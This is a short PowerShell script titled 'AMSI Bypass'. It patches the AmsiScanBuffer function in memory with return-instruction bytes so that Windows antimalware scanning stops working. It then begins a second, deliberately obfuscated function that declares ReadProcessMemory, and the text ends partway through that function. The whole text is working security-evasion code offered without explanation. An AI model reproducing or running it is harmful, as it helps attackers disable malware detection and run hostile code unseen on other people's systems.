# AMSI Bypass
$s = @"
using System;
using System.Runtime.InteropServices;
public class A {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $s
$a = [A]::LoadLibrary('amsi.dll')
$b = [A]::GetProcAddress($a, 'AmsiScanBuffer')
$p = [IntPtr]::Size -eq 8 ? 0x5 : 0x4
[void][A]::VirtualProtect($b, [uint32]$p, 0x40, [ref]0)
if ([IntPtr]::Size -eq 8) {
    [byte[]]@([byte]0xc3) | ForEach-Object { [System.Runtime.InteropServices.Marshal]::WriteByte($b, $_) }
} else {
    [byte[]]@([byte]0x33, [byte]0xc0, [byte]0xc3) | ForEach-Object { [System.Runtime.InteropServices.Marshal]::WriteByte($b, $_) }
}

function M$_Bypass {
<#
.Description
    Obfuscated Function
#>

param (
    $I$_Start = 0x50000,
    $N$_Offset = 0x50000,
    $M$_Offset = 0x1000000,
    $R$_Bytes = 0x50000
)

$O$_API = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
}
"@
Add-Type $O$_API
